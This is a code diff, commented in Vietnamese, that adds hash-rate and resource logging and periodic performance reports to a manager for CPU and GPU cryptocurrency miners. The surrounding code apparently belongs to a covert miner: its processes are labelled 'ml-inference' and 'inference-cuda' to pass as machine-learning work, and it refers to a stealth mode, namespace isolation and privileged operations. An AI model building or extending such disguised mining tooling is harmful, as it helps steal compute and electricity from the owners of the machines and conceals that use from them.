@@ -30,6 +30,17 @@ from mining_environment.scripts import setup_env, system_manager
 from mining_environment.scripts.privileged_operations import get_privileged_manager
 from mining_environment.cpu_plugins import get_inference_config
 
+# **Import** (nhập) **Mining Performance Logger** (trình ghi log hiệu suất khai thác)
+from mining_environment.logging.mining_performance_logger import (
+    register_mining_process,
+    log_hash_rate,
+    log_resource_usage,
+    log_mining_operation,
+    get_real_time_metrics,
+    generate_performance_comparison,
+    mining_perf_logger
+)
+
 # Thiết lập **log directory path** (đường dẫn thư mục logs - tệp ghi nhật ký)
 LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
 os.makedirs(LOGS_DIR, exist_ok=True)
@@ -186,9 +197,37 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
             
             if process:
                 logger.info(f"Quá trình khai thác {'CPU' if cpu else 'GPU'} đã được khởi động với PID: {process.pid}")
+                
+                # **Register process** (đăng ký tiến trình) với **Mining Performance Logger** (trình ghi log hiệu suất khai thác)
+                register_mining_process(process_name, process.pid, process)
+                
+                # **Log mining operation** (ghi log thao tác khai thác)
+                log_mining_operation(
+                    process_type=process_name,
+                    operation="START",
+                    pid=process.pid,
+                    details={
+                        "command": mining_command,
+                        "stealth_mode": enable_stealth and cpu,
+                        "namespace_isolation": enable_ns and privileged_manager is not None
+                    }
+                )
+                
+                # **Start log monitoring** (bắt đầu giám sát log) cho **hash rate extraction** (trích xuất tốc độ băm)
+                mining_perf_logger.monitor_process_logs(process_name, str(miner_log_path))
+                
                 time.sleep(2)
                 if process.poll() is not None:
                     logger.error(f"Quá trình khai thác {'CPU' if cpu else 'GPU'} kết thúc sớm.")
+                    
+                    # **Log early termination** (ghi log kết thúc sớm)
+                    log_mining_operation(
+                        process_type=process_name,
+                        operation="EARLY_TERMINATION",
+                        pid=process.pid,
+                        details={"return_code": process.returncode},
+                        status="FAILED"
+                    )
                     process = None
                 else:
                     return process
@@ -312,6 +351,13 @@ def manage_cpu_miner(privileged_mgr, max_retries: int = 5):
                             perf = status['mining_performance']
                             logger.debug(f"OptimizedMining: {perf['total_cpu_utilization']:.1f}% CPU, "
                                        f"{perf['hashrate']:.2f} H/s, {perf['active_workers']} workers")
+                            
+                            # **Log hash rate** (ghi log tốc độ băm) và **resource usage** (mức sử dụng tài nguyên)
+                            log_hash_rate("ml-inference", perf['hashrate'], {
+                                "cpu_utilization": perf['total_cpu_utilization'],
+                                "active_workers": perf['active_workers']
+                            })
+                            log_resource_usage("ml-inference")
                     else:
                         # **Optimized mining** (khai thác được tối ưu hóa) đã dừng, thử **restart** (khởi động lại)
                         logger.warning("OptimizedCalculationChain stopped, attempting restart...")
@@ -361,6 +407,9 @@ def manage_cpu_miner(privileged_mgr, max_retries: int = 5):
             else:
                 # Nếu **process** (tiến trình) đang chạy, **reset retries** (đặt lại số lần thử)
                 retries = 0
+                
+                # **Log resource usage** (ghi log mức sử dụng tài nguyên) cho **legacy CPU mining** (khai thác CPU cũ)
+                log_resource_usage("ml-inference")
         
         # **Wait** (đợi) trước khi kiểm tra lại
         stop_event.wait(30)
@@ -384,6 +433,10 @@ def manage_gpu_miner(privileged_mgr, max_retries: int = 5):
             new_process = start_mining_process(cpu=False, privileged_manager=privileged_mgr)
             with process_lock:
                 gpu_process = new_process
+        else:
+            # **Log resource usage** (ghi log mức sử dụng tài nguyên) cho **GPU mining** (khai thác GPU)
+            log_resource_usage("inference-cuda", force_gpu_check=True)
+        
         time.sleep(15)
     if retries >= max_retries:
         logger.error("GPU miner đã thất bại quá nhiều lần. Dừng giám sát.")
@@ -418,6 +471,41 @@ def main():
     else:
         logger.info("✅ Chỉ khởi động CPU mining thread (GPU không được cấu hình)")
     
+    # **Performance monitoring thread** (luồng giám sát hiệu suất)
+    def performance_monitor():
+        """Monitor và display real-time mining performance"""
+        last_report_time = time.time()
+        
+        while not stop_event.is_set():
+            try:
+                # **Generate performance report** (tạo báo cáo hiệu suất) mỗi 60 giây
+                if time.time() - last_report_time >= 60:
+                    comparison_report = generate_performance_comparison()
+                    logger.info("=== MINING PERFORMANCE REPORT ===")
+                    for line in comparison_report.split('\n'):
+                        if line.strip():
+                            logger.info(line)
+                    logger.info("=== END PERFORMANCE REPORT ===")
+                    last_report_time = time.time()
+                
+                # **Display real-time metrics** (hiển thị chỉ số thời gian thực) mỗi 30 giây
+                metrics = get_real_time_metrics()
+                cpu_metrics = metrics.get("ml-inference", {})
+                gpu_metrics = metrics.get("inference-cuda", {})
+                
+                logger.info(f"📊 REAL-TIME: CPU {cpu_metrics.get('current_hash_rate', 0):.2f} H/s | "
+                           f"GPU {gpu_metrics.get('current_hash_rate', 0):.2f} H/s | "
+                           f"Total {cpu_metrics.get('current_hash_rate', 0) + gpu_metrics.get('current_hash_rate', 0):.2f} H/s")
+                
+                time.sleep(30)
+            except Exception as e:
+                logger.error(f"Error in performance monitoring: {e}")
+                time.sleep(30)
+    
+    # **Start performance monitoring thread** (khởi động luồng giám sát hiệu suất)
+    perf_thread = threading.Thread(target=performance_monitor, daemon=True, name="PerformanceMonitor")
+    perf_thread.start()
+    
     # **Wait** (đợi) các **threads** (luồng) hoạt động và xử lý **stop signal** (tín hiệu dừng)
     try:
         while not stop_event.is_set():
@@ -437,6 +525,31 @@ def main():
     
     # **Cleanup** (dọn dẹp) và thoát
     logger.info("Bắt đầu quá trình dọn dẹp cuối cùng...")
+    
+    # **Export final performance report** (xuất báo cáo hiệu suất cuối cùng)
+    try:
+        final_report = generate_performance_comparison()
+        logger.info("=== FINAL MINING PERFORMANCE REPORT ===")
+        for line in final_report.split('\n'):
+            if line.strip():
+                logger.info(line)
+        logger.info("=== END FINAL REPORT ===")
+        
+        # **Export to file** (xuất ra file)
+        report_file = mining_perf_logger.export_performance_report()
+        logger.info(f"📄 Final performance report saved to: {report_file}")
+        
+    except Exception as e:
+        logger.error(f"Error generating final performance report: {e}")
+    
+    # **Log final mining operations** (ghi log các thao tác khai thác cuối cùng)
+    with process_lock:
+        if cpu_process:
+            log_mining_operation("ml-inference", "STOP", cpu_process.pid, 
+                                {"reason": "shutdown", "uptime": time.time()})
+        if gpu_process:
+            log_mining_operation("inference-cuda", "STOP", gpu_process.pid, 
+                                {"reason": "shutdown", "uptime": time.time()})
     
     # **Cleanup** (dọn dẹp) **optimized mining** (khai thác được tối ưu hóa) trước tiên
     global optimized_integration
